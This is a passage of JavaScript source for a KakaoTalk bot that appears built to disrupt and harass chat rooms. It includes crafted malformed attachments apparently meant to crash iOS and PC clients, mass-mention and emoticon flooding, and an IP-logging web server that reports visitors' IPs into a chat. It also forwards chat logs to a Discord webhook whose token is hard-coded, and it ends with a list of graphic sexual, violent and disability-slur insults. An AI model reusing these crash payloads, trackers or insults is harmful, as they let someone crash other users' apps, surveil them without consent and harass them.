                        msgSendAmount += 1;
                    };
                    var sendCount = 0;
                    userList.push("1");
                    startMention();
                    async function Cut15Send() {
                        if (sendCount < repeatAmount1) {
                            await delay(_delay);
                            sendCount++;
                            if (_mentionType == 1) {
                                await _kakaoChannel.sendChat(new $ChatBuilder().text("[15=>" + sendCount + "/" + msgSendAmount + "]\n").mentionContent(userList.slice((sendCount - 1) * 15, sendCount * 15)).build($KnownChatType.TEXT));
                            } else if (_mentionType == 2) {
                                await _kakaoChannel.sendChat(new $ChatBuilder().text("[15=>" + sendCount + "/" + msgSendAmount + "]\n").mentionContentInvisible(userList.slice((sendCount - 1) * 15, sendCount * 15)).build($KnownChatType.TEXT));
                            };
                            Cut15Send();
                            return;
                        } else {
                            allRepeated++;
                            if (repeatAmount2 == 0) {
                                if (allRepeated < _allRepeat) {
                                    sendCount = 0;
                                    Cut15Send();
                                    return;
                                };
                                await delay(_delay);
                                if (_msg) {
                                    await _kakaoChannel.sendChat("멘션 완료!");
                                };
                            } else {
                                CutUnderSend(true);
                            };
                        };
                    };
                    async function CutUnderSend(afterOver) {
                        await delay(_delay);
                        if (afterOver) {
                            sendCount++;
                            if (_mentionType == 1) {
                                await _kakaoChannel.sendChat(new $ChatBuilder().text("[" + repeatAmount2 + "=>" + sendCount + "/" + msgSendAmount + "]\n").mentionContent(userList.slice((sendCount - 1) * 15, (sendCount - 1) * 15 + repeatAmount2), false).build($KnownChatType.TEXT));
                            } else if (_mentionType == 2) {
                                await _kakaoChannel.sendChat(new $ChatBuilder().text("[" + repeatAmount2 + "=>" + sendCount + "/" + msgSendAmount + "]\n").mentionContentInvisible(userList.slice((sendCount - 1) * 15, (sendCount - 1) * 15 + repeatAmount2), true).build($KnownChatType.TEXT));
                            };
                        } else {
                            if (_mentionType == 1) {
                                await _kakaoChannel.sendChat(new $ChatBuilder().text("[" + repeatAmount2 + "]\n").mentionContent(userList.slice(repeatAmount1 * 15, repeatAmount1 * 15 + repeatAmount2)).build($KnownChatType.TEXT));
                            } else if (_mentionType == 2) {
                                await _kakaoChannel.sendChat(new $ChatBuilder().text("[" + repeatAmount2 + "]\n").mentionContentInvisible(userList.slice(repeatAmount1 * 15, repeatAmount1 * 15 + repeatAmount2)).build($KnownChatType.TEXT));
                            };
                        };
                        allRepeated++;
                        if (allRepeated < _allRepeat) {
                            sendCount = 0;
                            Cut15Send();
                            return;
                        };
                        await delay(_delay);
                        if (_msg) {
                            await _kakaoChannel.sendChat("멘션 완료!");
                        };
                        return;
                    };
                    async function startMention() {
                        if (_msg) {
                            await _kakaoChannel.sendChat("모든 유저를 멘션하기 시작합니다!\n멘션할 대상 수: " + mentionUserCount + " (자기자신 제외)\n사용할 메세지 수: " + msgSendAmount + "\n15*" + repeatAmount1 + " , " + repeatAmount2 + "*1");
                        };
                        Cut15Send();
                    };
                } else {
                    startMention();
                    async function CutUnderSend() {
                        await delay(_delay);
                        if (_mentionType == 1) {
                            await _kakaoChannel.sendChat(new $ChatBuilder().text("[" + mentionUserCount + "]\n").mentionContent(userList).build($KnownChatType.TEXT));
                        } else if (_mentionType == 2) {
                            await _kakaoChannel.sendChat(new $ChatBuilder().text("[" + mentionUserCount + "]\n").mentionContentInvisible(userList).build($KnownChatType.TEXT));
                        };
                        allRepeated++;
                        if (allRepeated < _allRepeat) {
                            sendCount = 0;
                            CutUnderSend();
                            return;
                        };
                        await delay(_delay);
                        if (_msg) {
                            await _kakaoChannel.sendChat("멘션 완료!");
                        };
                        return;
                    };
                    async function startMention() {
                        if (_msg) {
                            await _kakaoChannel.sendChat("모든 유저를 멘션하기 시작합니다!\n멘션할 대상 수: " + mentionUserCount);
                        };
                        CutUnderSend();
                    };
                };
            } catch (error) {
                outError = error + "$%^%$";
                outError = outError.replace("$%^%$", "");
                _kakaoChannel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
            };
        };

        function sendErrorIOS(_kakaoChannel) {
            try {
                /**
                 * 
                 * .append(new $AttachmentContent({
                        name: "https://nefew.kr/",
                        path: "4412207.emot_011.webp",
                        type: "image/webp",
                        width: new $ChatBuilder().text("ㅋㅋㄹㅃㅃ").build(26),
                        height: { "": [{ "": [] }] },
                        xconVersion: ["h", "t", "t", "p", "s", ":", "/", "/", "j", "h", "-", "s", "h", "o", "p", ".", "k", "r", "/"],
                        s: [{ false: true }],
                        alt: "카카오 이모티콘",
                    }))
                 */
                _kakaoChannel.sendChat(
                    new $ChatBuilder().text(" ", { "": [{ "": [] }] }).append(new $AttachmentContent({
                        name: "https://nefew.kr/",
                        path: "4412207.emot_011.webp",
                        type: "image/webp",
                        width: new $ChatBuilder().text("ㅋㅋㄹㅃㅃ").build(26),
                        height: { "": [{ "": [] }] },
                        xconVersion: ["h", "t", "t", "p", "s", ":", "/", "/", "j", "h", "-", "s", "h", "o", "p", ".", "k", "r", "/"],
                        s: [{ false: true }],
                        alt: "카카오 이모티콘",
                    })).build(23)
                );
            } catch (error) {
                outError = error + "$%^%$";
                outError = outError.replace("$%^%$", "");
                _kakaoChannel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
            };
        };

        function arrChunk(arr, size) {
            var i,
                j,
                temparray = [],
                chunk = size;
            for (i = 0, j = arr.length; i < j; i += chunk) {
                temparray.push(arr.slice(i, i + chunk));
            };
            return temparray;
        };

        function pausecomp(millis) {
            var date = new Date();
            var curDate = null;
            do {
                curDate = new Date();
            } while (curDate - date < millis);
        };

        async function cleanChat(cleanChannel, amount, finalMSG) {
            try {
                await cleanChannel.sendChat("---채팅청소 시작지점---");
            } catch {
                return;
            }
            var cleanMSG = new $ChatBuilder().append(new $AttachmentContent({
                "type": "image/webp",
                "path": '4412207.emot_017.webp',
                "name": "(이모티콘)",
                "sound": "",
                "width": 10000,
                "height": 10000,
                "msg": "",
                "alt": "카카오 이모티콘"
            })).build(25);
            for (var i = 0; i < amount; i++) {
                cleanChannel.sendChat(cleanMSG);
                await delay(110);
            };
            if (finalMSG != false) {
                cleanChannel.sendChat(finalMSG);
            };
        };

        function sendErrorCom(_kakaoChannel) {
            try {
                _kakaoChannel.sendChat(
                    new $ChatBuilder()
                        .text("Search")
                        .append(new $AttachmentContent({
                            "R": [
                                {
                                    "L": "https://m.search.daum.net/kakao?w=tot&DA=SH1&rtmaxcoll=Z8T&q=%EC%A0%84%EA%B5%AD+%EC%98%A4%EB%8A%98+%EB%82%A0%EC%94%A8",
                                    "MA": [],
                                    "D": "PC 튕",
                                    "PL": "튕",
                                    "TM": "겨",
                                    "SU": [
                                        {
                                            "TE": "",
                                            "T": "G",
                                            "IC": "",
                                            "DE": ""
                                        },
                                        {
                                            "TE": "",
                                            "T": "O",
                                            "IC": "",
                                            "DE": ""
                                        },
                                        {
                                            "TE": "",
                                            "T": "K",
                                            "IC": "",
                                            "DE": ""
                                        },
                                        {
                                            "TE": "",
                                            "T": "S",
                                            "IC": "",
                                            "DE": ""
                                        },
                                        {
                                            "TE": "",
                                            "T": "S",
                                            "IC": "",
                                            "DE": ""
                                        },
                                        {
                                            "TE": "",
                                            "T": "H",
                                            "IC": "28",
                                            "DE": ""
                                        },
                                        {
                                            "TE": "",
                                            "T": "O",
                                            "IC": "",
                                            "DE": ""
                                        },
                                        {
                                            "TE": "",
                                            "T": "P",
                                            "IC": "",
                                            "DE": ""
                                        }
                                    ]
                                }
                            ],
                            "V": "weather",
                            "callingPkg": "",
                            "L": "https://www.youtube.com/watch?v=BLh8IVr8lCk",
                            "Q": "PC"
                        }))
                        .build(23)
                );
            } catch (error) {
                outError = error + "$%^%$";
                outError = outError.replace("$%^%$", "");
                _kakaoChannel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
            };
        };

        function delay(time) {
            return new Promise(resolve => setTimeout(resolve, time));
        };

        importAdmin();
        await login();
        noAsync();
    };
};

function readableToBuffer(readable) {
    const chunks = [];
    return new Promise((resolve, reject) => {
        readable.on('data', (chunk) => chunks.push(Buffer.from(chunk)));
        readable.on('error', (err) => reject(err));
        readable.on('end', () => resolve(Buffer.concat(chunks)));
    });
}

// https://discord.com/api/webhooks/1014867602968952843/zfc7bnuKpsEIQ1lCs23yf2ibdrOLzk6O0TJQGBu6zDSYfl6E6KBY8gVaZQF_70R5SpE5
function discordWebHook(_kakaoChannel, what, who, whoPf, when, where) {
    /*var params = {
        username: "ACHOO LOCO BOT",
        avatar_url: "https://cdn.donmai.us/sample/c6/27/sample-c62707a4860be81689de8208dd2ab5b4.jpg",
        content: "chat log",
        embeds: [
            {
                author: {
                    name: who,
                    url: "https://google.com",
                    icon_url: whoPf
                },
                title: "Chat Logging",
                description: "LocoBot chat logging",
                color: 15258703,
                fields: [
                    {
                        name: "room name",
                        value: where,
                        inline: true
                    },
                    {
                        name: "time",
                        value: when,
                        inline: true
                    },
                    {
                        name: "chat",
                        value: what
                    }
                ],
                footer: {
                    text: "Powered by Node-kakao"
                }
            }
        ]    
    };*/
    var webhookData = {
        "content": "LocoBot Logging",
        "username": "ACHOO LOCO BOT",
        "avatar_url": "https://cdn.donmai.us/sample/c6/27/sample-c62707a4860be81689de8208dd2ab5b4.jpg",
        "embeds": [
            {
                "title": "ACHOO LOCO BOT",
                "description": "Kakaotalk -> Discord",
                "url": "https://google.com",
                "color": 15258703,
                "footer": {
                    "icon_url": "",
                    "text": "Powered By Node-Kakao"
                },
                "author": {
                    "name": who,
                    "url": whoPf,
                    "icon_url": whoPf
                },
                "fields": [
                    {
                        "name": "room name",
                        "value": where,
                        "inline": true
                    },
                    {
                        "name": "time",
                        "value": when,
                        "inline": true
                    },
                    {
                        "name": "chat",
                        "value": what
                    }
                ]
            }
        ]
    }
    var send = JSON.stringify(webhookData);
    var config = {
        methood: "POST",
        url: "https://discord.com/api/webhooks/1014867602968952843/zfc7bnuKpsEIQ1lCs23yf2ibdrOLzk6O0TJQGBu6zDSYfl6E6KBY8gVaZQF_70R5SpE5",
        headers: { 'Content-Type': 'application/json' },
        data: webhookData
    };

    /*axios.post(config)
        .then((response) => {
            return response;
        })
        .catch((error) => {
            console.log(error);
            return error;
        });*/

    axios.post(dikoHook, send, { headers: { 'Content-Type': 'application/json' } })
        .then((response) => {
            return response;
        })
        .catch((error) => {
            console.log(error);
            return error;
        });
    /*var embed = new MessageBuilder()
    .setTitle("KakaoTalk Chat Logging")
    .setAuthor(who, whoPf, whoPf)
    .addField('room name', where, true)
    .addField('time', when, true)
    .addField('chat', what)
    .addField('#00b0f4')
    .setDescription('LocoBot Chat Logging')
    .setFooter('Powered by Node-Kakao')
    .setTimestamp();
    
    hook.send(embed);*/
}

async function LED(upWhereInfo, downWhereInfo, upStnInfo, downStnInfo, upStatInfo, downStatInfo) {
    //var img = await loadImage('./bot/led.png');
    //var canvas = createCanvas(img.width, img.height);
    // 770, 300
    var canvas = createCanvas(770, 300);
    var ctx = canvas.getContext('2d');
    ctx.font = "54px DungGeunMo";
    //ctx.drawImage(img, img.width, img.height);

    ctx.fillRect(0, 0, 770, 300);
    async function where(uptoGo, downtoGo) { // 행선지가 어디인가?
        if (uptoGo.length == 3 || downtoGo.length == 3) { // 207, 55
            var fstxt = uptoGo.substring(0, 1);
            var setxt = uptoGo.substring(1, 2);
            var thtxt = uptoGo.substring(2, 3);
            var fstxt1 = uptoGo.substring(0, 1);
            var setxt2 = uptoGo.substring(1, 2);
            var thtxt3 = uptoGo.substring(2, 3);
            var fntxt = fstxt + ' ' + setxt + ' ' + thtxt + ' 행';
            var fntxt1 = fstxt1 + ' ' + setxt2 + ' ' + thtxt3 + ' 행';
            const {
                actualBoundingBoxLeft,
                actualBoundingBoxRight,
                emHeightAscent: titleHeight,
                actualBoundingBoxAscent,
                actualBoundingBoxDescent,
                emHeightDescent,
            } = ctx.measureText(fntxt);
            const titlePosition = {
                x: 214,
                y: 140,
            };
            // - ((textPaint.descent() + textPaint.ascent()) / 2
            ctx.fillStyle = "#fb8d19";
            ctx.textAlign = "center";
            ctx.fillText(fntxt, titlePosition.x, titlePosition.y);
            ctx.fillText(fntxt1, titlePosition.x, titlePosition.y + 65);

        } else if (uptoGo.length == 2 || downtoGo.length == 2) { // 214, 205
            var fstxt = uptoGo.substring(0, 1);
            var setxt = uptoGo.substring(1, 2);
            var fstxt1 = downtoGo.substring(0, 1);
            var setxt2 = downtoGo.substring(1, 2);
            var fntxt = fstxt + ' ' + setxt + ' 행';
            var fntxt1 = fstxt1 + ' ' + setxt2 + ' 행';

            /*const {
                actualBoundingBoxLeft,
                actualBoundingBoxRight,
                emHeightAscent: titleHeight,
                actualBoundingBoxAscent,
                actualBoundingBoxDescent,
                emHeightDescent,
            } = ctx.measureText(fntxt);*/
            const titlePosition = {
                x: 214,
                y: 140,
            };
            // - ((textPaint.descent() + textPaint.ascent()) / 2
            ctx.fillStyle = "#fb8d19";
            ctx.textAlign = "center";
            ctx.fillText(fntxt, titlePosition.x, titlePosition.y);
            ctx.fillText(fntxt1, titlePosition.x, titlePosition.y + 65);

        }
    }

    async function stn(whatUp, whatDown) { // 어기서 출발했는가?
        if (whatUp.length == 3 || whatDown.length == 3) { // 207, 55
            var fstxt = whatUp.substring(0, 1);
            var setxt = whatUp.substring(1, 2);
            var thtxt = whatUp.substring(2, 3);
            var fstxt1 = whatDown.substring(0, 1);
            var setxt2 = whatDown.substring(1, 2);
            var thtxt3 = whatDown.substring(2, 3);
            var fntxt = fstxt + ' ' + setxt + ' ' + thtxt;
            var fntxt1 = fstxt1 + ' ' + setxt2 + ' ' + thtxt3;
            /*const {
                actualBoundingBoxLeft,
                actualBoundingBoxRight,
                emHeightAscent: titleHeight,
                actualBoundingBoxAscent,
                actualBoundingBoxDescent,
                emHeightDescent,
            } = ctx.measureText(fntxt);*/
            const titlePosition = {
                x: 430,
                y: 140,
            };
            // - ((textPaint.descent() + textPaint.ascent()) / 2
            ctx.fillStyle = "#5C6F0E";
            ctx.textAlign = "center";
            ctx.fillText(fntxt, titlePosition.x, titlePosition.y);
            ctx.fillText(fntxt1, titlePosition.x, titlePosition.y + 65);

        } else if (whatUp.length == 2 || whatDown.length == 2) { // 214, 205
            var fstxt = whatUp.substring(0, 1);
            var setxt = whatUp.substring(1, 2);
            var fstxt1 = whatDown.substring(0, 1);
            var setxt2 = whatDown.substring(1, 2);
            var fntxt = fstxt + ' ' + setxt;
            var fntxt1 = fstxt1 + ' ' + setxt2;

            const {
                actualBoundingBoxLeft,
                actualBoundingBoxRight,
                emHeightAscent: titleHeight,
                actualBoundingBoxAscent,
                actualBoundingBoxDescent,
                emHeightDescent,
            } = ctx.measureText(fntxt);
            const titlePosition = {
                x: 430,
                y: 140,
            };
            // - ((textPaint.descent() + textPaint.ascent()) / 2
            ctx.fillStyle = "#5C6F0E";
            ctx.textAlign = "center";
            ctx.fillText(fntxt, titlePosition.x, titlePosition.y);
            ctx.fillText(fntxt1, titlePosition.x, titlePosition.y + 65);

        }
    }

    async function stats(up, down) { // 도착=0, 출발=1, 접근=2 508, 100
        var xPos = 600;
        if (up == 0) {
            const {
                actualBoundingBoxLeft,
                actualBoundingBoxRight,
                emHeightAscent: titleHeight,
                actualBoundingBoxAscent,
                actualBoundingBoxDescent,
                emHeightDescent,
            } = ctx.measureText(up);
            const titlePosition = {
                x: xPos,
                y: 140,
            };
            // - ((textPaint.descent() + textPaint.ascent()) / 2
            ctx.fillStyle = "#b22222";
            ctx.textAlign = "center";
            ctx.fillText("도 착", titlePosition.x, titlePosition.y);
        } else if (up == 1) {
            const {
                actualBoundingBoxLeft,
                actualBoundingBoxRight,
                emHeightAscent: titleHeight,
                actualBoundingBoxAscent,
                actualBoundingBoxDescent,
                emHeightDescent,
            } = ctx.measureText(up);
            const titlePosition = {
                x: xPos,
                y: 140,
            };
            // - ((textPaint.descent() + textPaint.ascent()) / 2
            ctx.fillStyle = "#b22222";
            ctx.textAlign = "center";
            ctx.fillText("출 발", titlePosition.x, titlePosition.y);
        } else {
            const {
                actualBoundingBoxLeft,
                actualBoundingBoxRight,
                emHeightAscent: titleHeight,
                actualBoundingBoxAscent,
                actualBoundingBoxDescent,
                emHeightDescent,
            } = ctx.measureText(up);
            const titlePosition = {
                x: xPos,
                y: 140,
            };
            // - ((textPaint.descent() + textPaint.ascent()) / 2
            ctx.fillStyle = "#b22222";
            ctx.textAlign = "center";
            ctx.fillText("접 근", titlePosition.x, titlePosition.y);
        }
        if (down == 0) {
            const {
                actualBoundingBoxLeft,
                actualBoundingBoxRight,
                emHeightAscent: titleHeight,
                actualBoundingBoxAscent,
                actualBoundingBoxDescent,
                emHeightDescent,
            } = ctx.measureText(down);
            const titlePosition = {
                x: xPos,
                y: 205,
            };
            // - ((textPaint.descent() + textPaint.ascent()) / 2
            ctx.fillStyle = "#b22222";
            ctx.textAlign = "center";
            ctx.fillText("도 착", titlePosition.x, titlePosition.y);
        } else if (down == 1) {
            const {
                actualBoundingBoxLeft,
                actualBoundingBoxRight,
                emHeightAscent: titleHeight,
                actualBoundingBoxAscent,
                actualBoundingBoxDescent,
                emHeightDescent,
            } = ctx.measureText(down);
            const titlePosition = {
                x: xPos,
                y: 205,
            };
            // - ((textPaint.descent() + textPaint.ascent()) / 2
            ctx.fillStyle = "#b22222";
            ctx.textAlign = "center";
            ctx.fillText("출 발", titlePosition.x, titlePosition.y);
        } else {
            const {
                actualBoundingBoxLeft,
                actualBoundingBoxRight,
                emHeightAscent: titleHeight,
                actualBoundingBoxAscent,
                actualBoundingBoxDescent,
                emHeightDescent,
            } = ctx.measureText(down);
            const titlePosition = {
                x: xPos,
                y: 205,
            };
            // - ((textPaint.descent() + textPaint.ascent()) / 2
            ctx.fillStyle = "#b22222";
            ctx.textAlign = "center";
            ctx.fillText("접 근", titlePosition.x, titlePosition.y);
        }
    }

    await where(upWhereInfo, downWhereInfo);
    await stn(upStnInfo, downStnInfo);
    await stats(upStatInfo, downStatInfo);

    //var stream = canvas.createPNGStream();
    var buf2 = canvas.toBuffer('image/png', { compressionLevel: 3, filters: canvas.PNG_FILTER_NONE })

    //const out = fs.createWriteStream('./bot/Led_Test.png');
    //var output;
    //var buff = new Buffer();
    //stream.pipe(buff);

    //out.on("finish", () => {
    //    console.log("finished.");
    //});
    //var rtnValue = buf2.toString();
    //console.log(buf2);
    var LEDupload = buf2;
    //console.log(LEDupload);
    return LEDupload;
} 

function userPerms(_kakaoChannel, _userid, _perm) {
    //CLIENT.OpenLinkManager.setOpenMemberType(_kakaoChannel, _userid, null);
    switch(_perm) {
        case 2: // 평민
            CLIENT.OpenLinkManager.setOpenMemberType(_kakaoChannel, _userid, 2);
            break;
        case 4: // 부방
            CLIENT.OpenLinkManager.setOpenMemberType(_kakaoChannel, _userid, 4);
            break;
        case 8: // 봇(?)
            CLIENT.OpenLinkManager.setOpenMemberType(_kakaoChannel, _userid, 8);
            break;
        default:
            _kakaoChannel.sendChat("권한이 잘못되었습니다.");
            break;
    }
    return;
}

async function ttsCommand(_kakaoChannel, text, langCode) {
    if (text > 200) {
        _kakaoChannel.sendChat("200자를 초과할수 없습니다.");
        return;
    }
    var data = Buffer.form(await googleTTS.getAudioBase64(text, { lang }), 'base64');
    var res = await $AttachmentApi.upload($KnownChatType.FILE, 'tts.mp3', data);
    if (!res.success) {
        _kakaoChannel.sendChat(`업로드중 오류가 발생했습니다. status: ${res.status}`);
    }
    await _kakaoChannel.sendChat(
        new $ChatBuilder()
            .attachment(res.result)
            .attachment({ d: 10 })
            .build($KnownChatType.AUDIO)
    );
}

async function start() {
    console.clear();
    console.log('\n',
        '\n  ######## ######## ######## ######## ######## ######## ######## ######## ######## ######## ',
        '\n  #  ##  # #      # #      # #      # #  ###   ######## #  ##### ##    ## ##    ## ##    ## ',
        '\n  #   #  # #  ##### #  ##### #  ##### #  ###   ######## #  ##### #  ##  # #  ##  # #  ##  # ',
        '\n  #      # #    ### #    ### #    ### #  # #   ######## #  ##### #  ##  # #  ##### #  ##  # ',
        '\n  #      # #  ##### #  ##### #  ##### #        ######## #  ##### #  ##  # #  ##### #  ##  # ',
        '\n  #  #   # #  ##### #  ##### #  ##### #   #    ######## #  ##### #  ##  # #  ##  # #  ##  # ',
        '\n  #  ##  # #      # #  ##### #      # #  ###   ######## #      # ##    ## ##    ## ##    ## ',
        '\n  ######## ######## ######## ######## ######## ######## ######## ######## ######## ######## ',
        '\n',
        '\n  #################################################################',
        '\n  ##---ㄴ1.DefaultBot--------------------------------------------##',
        '\n  ##---ㄴ2.MultiBot----------------------------------------------##',
        '\n  ##---ㄴ3.RandomUUID--------------------------------------------##',
        '\n  ##---ㄴ4.Exit--------------------------------------------------##',
        '\n  #################################################################',
        '\n');
    var getMenu = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    var menu = await new Promise(resolve => getMenu.question("   >> (1/2/3/4): ", resolve));
    getMenu.close();
    if (menu == "1") {
        let botClass = new Bot();
        await botClass.startBot(`${email} ${pw} ${deviceUUID} ${deviceName}`);
    } else if (menu == "2") {
        let botClass = new Bot();
        console.log("\n   >> multi-account.txt 에 계정을 적어주세요.");
        console.log("\n   >> 양식 - 이메일:비번:UUID");
        var getMenu2 = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });
        var menu2 = await new Promise(resolve => getMenu2.question("   >> 준비 후 ENTER: ", resolve));
        getMenu2.close();
        fs.readFile('./multi-account.txt', 'utf8', async function (err, data) {
            var accList = data.split('\n');
            var loginCount = 0;
            async function loginCountFunction() {
                await botClass.startBot(`${accList[loginCount].split(':')[0]} ${accList[loginCount].split(':')[1]} ${accList[loginCount].split(':')[2]} ${deviceName}`);
                loginCount++;
                if (loginCount != accList.length) {
                    loginCountFunction();
                    return;
                };
            };
            loginCountFunction();
        });
    } else if (menu == "3") {
        var getAmount = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });
        var menu = await new Promise(resolve => getAmount.question("   >> UUID개수: ", resolve));
        getAmount.close();
        menu *= 1;
        for (var i = 0; i < menu; i++) {
            console.log(crypto.default.randomBytes(64).toString('base64'));
        };
    } else if (menu == "4") {
        process.exit();
    } else {
        start();
        return;
    };
};

function isKeyExists(obj, key) {
    if (obj[key] == undefined) {
        return false;
    } else {
        return true;
    };
};

function getClientIpFromXForwardedFor(value) {
    if (!is.existy(value)) {
        return null;
    };
    if (is.not.string(value)) {
        throw new TypeError("Expected a string, got \"".concat(_typeof(value), "\""));
    };
    var forwardedIps = value.split(',').map(function (e) {
        var ip = e.trim();
        if (ip.includes(':')) {
            var splitted = ip.split(':');
            if (splitted.length === 2) {
                return splitted[0];
            };
        };
        return ip;
    });
    return forwardedIps.find(is.ip);
};

function getClientIp(req) {
    if (req.headers) {
        if (is.ip(req.headers['x-client-ip'])) {
            return req.headers['x-client-ip'];
        };
        var xForwardedFor = getClientIpFromXForwardedFor(req.headers['x-forwarded-for']);
        if (is.ip(xForwardedFor)) {
            return xForwardedFor;
        };
        if (is.ip(req.headers['cf-connecting-ip'])) {
            return req.headers['cf-connecting-ip'];
        };
        if (is.ip(req.headers['fastly-client-ip'])) {
            return req.headers['fastly-client-ip'];
        };
        if (is.ip(req.headers['true-client-ip'])) {
            return req.headers['true-client-ip'];
        };
        if (is.ip(req.headers['x-real-ip'])) {
            return req.headers['x-real-ip'];
        };
        if (is.ip(req.headers['x-cluster-client-ip'])) {
            return req.headers['x-cluster-client-ip'];
        };
        if (is.ip(req.headers['x-forwarded'])) {
            return req.headers['x-forwarded'];
        };
        if (is.ip(req.headers['forwarded-for'])) {
            return req.headers['forwarded-for'];
        };
        if (is.ip(req.headers.forwarded)) {
            return req.headers.forwarded;
        };
    };
    if (is.existy(req.connection)) {
        if (is.ip(req.connection.remoteAddress)) {
            return req.connection.remoteAddress;
        };

        if (is.existy(req.connection.socket) && is.ip(req.connection.socket.remoteAddress)) {
            return req.connection.socket.remoteAddress;
        };
    };
    if (is.existy(req.socket) && is.ip(req.socket.remoteAddress)) {
        return req.socket.remoteAddress;
    };
    if (is.existy(req.info) && is.ip(req.info.remoteAddress)) {
        return req.info.remoteAddress;
    };
    if (is.existy(req.requestContext) && is.existy(req.requestContext.identity) && is.ip(req.requestContext.identity.sourceIp)) {
        return req.requestContext.identity.sourceIp;
    };
    return null;
};

app.get('/', async function (req, res) {
    await res.sendFile("ip.png", { root: __dirname + '/bot' });
    var nofilterIP = getClientIp(req);
    var ip = nofilterIP.split(':')[nofilterIP.split(':').length - 1];
    if (ipLog_usingServer != "None" && ipLog_loggedIps.includes(ip) == false) {
        if ((ipLog_local != ip && ipLog_admin != ip) || ipLog_filter == false) {
            ipLog_channel.sendChat("IP: " + ip + "\nBROWSER: " + req.headers["user-agent"] + "\nLANGUAGE: " + req.headers["accept-language"]);
            ipLog_loggedIps.push(ip);
        };
    };
});
app.listen(ipPort, function () { });
console.log("\n\n  >> `Express` server started at port " + ipPort);
start();

let mentArray = [
    "느그 할매가 보지에 싸커킥 꽂으면 안뚫리고 양수 질질 새는 강철해보지라 니 애미도 그런거임? ㅋㅋㅋㅋ 벽에 '여자' 이렇ㄱ데 써두고 쳐다보니까 존나 딱딱하게 발기해서 치기도 전에 쿠퍼액 정액 모든 채액을 질질 싸던 니 애비랑 강철개보지 니 애미랑 존나 잘어울리더가 ㅋㅋㅋㅋㅋㅋ",
    "니 장애 애비랑 개보지 애미랑 섹스해서 나온 결과가 너라는걸 보면 딱 니가 하는 행동들이 이해가 된다 ㅋㅋㅋ 우선 내가 너보다 훨씬 우월하다는걸 알려줄게 사자성어로 비유하자면 천양지차 나는 하늘이고 너는 땅이지 안그래 좆밥 니애비 보지년아? 지금 너의 수준 너의 급은 니 애미가 최음제 쳐먹고 잠들어있을때 보지 할짝할짝거리던 패륜아 그 이상도 그 이하도 아니야 ㅋㅋㅋㅋ",
    "중졸 니 할카스 할배마냥 말같지도 않은 말 버벅 버벅 지지직 니집 인터넷마냥 렉걸리면서 하는 니애미 개보지년아 ㅋㅋㅋㅋ 난 너가 개좆밥인데 그렇게 나대는 이유가 이해가 안가고 납득이 안가 ㅋㅋㅋ 왜 니가 나한테 이렇게 털리는지 이제 알갔네 너는 카카오톡 디스코드 스카이프 각종 sns 밑바닥에서 어떻게든 기어오르려는 우물안 개구리에 불과하기 떄문이야 병신아 ㅋㅋㅋㅋㅋ",
    "어떻게든 반박하고 이겨볼려고 닭대가리 즉흥적으로 굴리니까 개털러지 말주변 말재간머리 좆도 없는 수준 밑바닥 좆밥 찌끄래기 새끼야 ㅋㅋㅋ 니 애비가 빡대가리라 니 애비 눈앞에서 할배 배 가르고 오장육부 좌뇌 우뇌 꺼내서 각각 무슨 역할을 하고 무슨 기능이 있는지 설명해주니까 고맙다면서 나보고 절하더라 ㅋㅋㅋㅋㅋㅋ",
    "내가 니엄마였다면 아마 내가 세상에서 제일 상실감이 컸을거다. 귀여운 애기가 나올줄 알고 1년동안 애지중지 기대하며 애비랑 같이 키웠는데 웬 고블릿 하이오크년이 꾸득꾸득 기어나왔는데 내가 니애미였으면 니 내 보지에서 나오자마자 탯줄 끊기도 전에 꼬추 잡고 인큐베이터에 던져서 명치 뒤지게 가격한다 ㅋㅋㅋ",
    "병신련아 니애비는 기형아로 태어나서 코로 막걸리 넣어줬더니 존나 발기하면서 귀두로 나온 장애인새끼던데 ㅋㅋㅋㅋ 팔 한쪽 다리 한쪽 없는 장애인 몸뚱아리 애비가 열심히 키워줬으면 감사합니다~ 하고 열심히 살아 방구석에서 페미 쿵쾅이들이랑 넷상연애 하지 말고 ㅋㅋㅋ 제발 사람답게 살아라",
    "니애비가 얼마나 한심한지 알려줄까? 팔 한쪽 없어서 손 하나로 열심히 장애인연금 신청하는 방법 7시간동안 찾아보면서 겨우 신청했는데 네트워크 404 오류 뜨면서 초기화 되니까 뒤지게 빡돌고 눈깔 뒤집혀서 자살한 분조장 병신새끼잖아 ㅋㅋㅋㅋㅋㅋ",
    "니애미는 너 낳기 전에 5대1로 강간당해서 자식 7명 키워서 대학보낸 베테랑이라 너정도 자폐아는 잘 키워내실줄 알았는데 아니네? 초사이언 베테랑 하수구보지 애미도 너정도로 심각하게 지능이 딸리는 병신은 못키워내시는듯 ㅇㅇ; 니가 니 애미 보지에서 기어나오기 전에 칼빵 뒤지게 박았어야 했는데,,, 아쉽네 ㅋㅋ",
    "나대지좀 마 좆밥 찌끄러기 병신 오타쿠 히키코모리년아~ 나대다가 아가리 대가리 밭다리 안다리 옆다리 꺽이고 이리저리 사방팔방 왔다리갔다리 후드러맞고 뚜드러맞고 따드러맞고 그냥 개쳐맞은 자폐아년아 ㅋㅋㅋ~ 너같은 좆밥 장애인은 사회에서 나돌아댕길 자격 없어 이 동물원 원숭이 아들내미 시발넘아~",
    "느개비 똥구녕 좆구녕 콧구녕 땀구녕 요도구녕 온~갖 구멍에 구멍들을 느그애미 똥구녕마냥 확장시켜버려줄까? ㅋㅋㅋ 너같은 사회에서 격리되고 배척된 인간쓰레기들도 살아가는데 나같이 너보다 높은 위치에서 내려다보는 존재는 너희들을 내려봤을때 정말 역겨워 뒤지겠다 이말이야~ 이해력 판단력 구별능력 딸리는 시발 벌레새끼야 ㅋㅋㅋ",
    "뇌에 비계덩어리 지방덩어리 온갖 살덩어리는 다 껴가지고 말도 똑바로 제대로 못하는 년아 나대지 말고 니 문드러진 면상마냥 짜져있어 가리가리 아가리 대가리 턱주가리 오른쪽다리 왼쪽다리 발다리 안다리 앞다리 뒷다리르 꺽은담에 일본도 가져다가 팔다리 다쑤셔 잘라버려서 닉부이찌찌 만들어버리기 전에 개씨발장애인아 ㅋㅋㅋㅋㅋ",
